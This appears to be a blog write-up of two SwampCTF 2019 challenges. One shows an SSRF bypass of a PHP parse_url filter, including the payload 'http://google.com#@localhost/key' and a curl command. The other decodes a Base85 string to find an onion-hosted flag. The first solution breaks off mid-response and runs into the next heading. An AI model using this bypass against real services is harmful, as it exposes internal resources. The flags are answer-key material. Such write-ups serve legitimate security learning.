### Problem Description

It's the year 1997 and the Internet is just heating up! :fire:

In order to get ahead of the curve, SIT Industries® has introduced it's first Internet product: The Link Saver™. SIT Industries® has been very secretive about this product - even going so far to hire Kernel Sanders® to test the security!

However, The Kernel discovered that The Link Saver had a little bit of an SSRF problem that allowed any user to fetch the code for The Link Saver™ from https://localhost/key and host it themselves :grimacing:. Fortunately, with a lil' parse_url magic, SIT Industries® PHP wizards have patched this finding from Kernel Sanders® and are keeping the code behind this wonderful site secure!

... or have they? :wink:

### Solution

After connecting to the [website](http://chal1.swampctf.com:1244/) of the challenge, we obtain the following page:

![_config.yml]({{ site.baseurl }}/images/2019-4-8-SwampCTF2019/swampctf2019_img1.png)

There was an input field in the page allowing us to send a request to the URL we wanted.

After some tries I noticed that the only accepted URL was <www.google.com>. Taking this into account, we tried injecting <http://google.com#@localhost/key>.

```
$ curl http://google.com#@localhost/key --data="link=http://google.com#@localhost/key"

<html>

    <title>Link Fetcher</title>

<body>
    <h1>The Link Fetcher</h1>
    <p>Want to remember cool links? This link fetcher will fetch links and store them for you!</p>
    <form action="/" method="POST">

## NIT [128]

### Problem Description

The network investigative technique had just triggered and we were starting receive telemetry when, suddenly, a pop-up asked him for administrative access. He freaked out and yanked his cable leaving us with a copious amount of line noise. We've been tracking this guy for a while and really need a win here.

See if you can get anything out of this mess:

### Solution

We received a ciphered/encoded string, "A7]^gF*(u(BkVO)1MV#U/oPWADf.4LBQ&)IE+j2TD.GLe2e4XS@q%-(3+b!&3+=g#AMcDXAMuMZ@:V/M2e4jY". After trying to decipher it using many Cipher algorithms, I found the solution. It was encoded using [Base85](https://en.wikipedia.org/wiki/Ascii85):

I used [CyberChef](https://gchq.github.io/CyberChef) to decode the string obtaining an onion link (depastedihrn3jtw.onion/show.php?md5=7d1ecb0f8f428b70e49de68ead337d7e):

![_config.yml]({{ site.baseurl }}/images/2019-4-8-SwampCTF2019/swampctf2019_img2.png)

This link shows the following information in the comments:

![_config.yml]({{ site.baseurl }}/images/2019-4-8-SwampCTF2019/swampctf2019_img3.jpg)

The comment with "flag = fecabed47e50e3a2b615e86d0e0f1c59" suggested me to visit the following onion link (depastedihrn3jtw.onion/show.php?md5=fecabed47e50e3a2b615e86d0e0f1c59), which shows the flag:

![_config.yml]({{ site.baseurl }}/images/2019-4-8-SwampCTF2019/swampctf2019_img4.jpg)
